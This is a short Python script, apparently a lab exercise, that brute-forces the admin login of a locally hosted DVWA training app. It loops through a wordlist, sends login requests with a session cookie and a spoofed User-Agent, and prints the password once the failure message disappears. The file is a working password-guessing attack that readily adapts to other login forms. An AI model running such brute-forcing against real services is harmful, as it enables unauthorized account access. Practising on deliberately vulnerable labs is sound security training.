import requests
import re

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36'}

cookies = {
    'PHPSESSID':'2ambsjutg82827l97vqiai3lu4',
     'security':'low'
}

with open('D:\python\python项目目录\ctf\wordlist.txt','r') as f:
    for x in f.readlines():
        passwd = x.strip('\n')

        url = 'http://www.mydvwa.com:90/vulnerabilities/brute/?username=admin&password=%s&Login=Login#'%(passwd)

        r = requests.get(url,headers=headers,cookies=cookies,timeout=10)

        x = re.findall(r'incorr',r.text)
        print('已经过滤掉的密码',passwd)
        if  len(x)==0:
            print(passwd)
            break


print('结束')